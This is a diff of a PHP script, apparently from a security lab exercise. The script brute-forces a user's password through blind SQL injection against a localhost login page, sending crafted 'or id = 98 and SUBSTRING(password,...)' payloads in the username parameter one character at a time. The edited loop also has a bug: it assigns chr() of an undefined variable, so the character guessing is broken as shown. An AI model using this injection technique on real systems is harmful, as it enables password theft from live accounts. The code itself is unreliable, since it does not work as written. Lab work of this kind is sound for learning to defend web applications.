@@ -80,8 +80,8 @@ echo 'password: ';
 
 $letter = "";
 for ($i = 1; $i <= $sizepwd; $i++) {
-    foreach (range(0,100) as $letter){
-    	//$letter = chr($character);
+    foreach (range(48,127) as $letter){
+    	$letter = chr($character);
          //echo "$letter \n";
     	$url="http://localhost/lab09/login.php?u=\"%20or%20id%20=%2098%20and%20SUBSTRING(password,$i,1)%20=%20%27$letter%27%20--%20";
 		$result = file_get_contents($url);
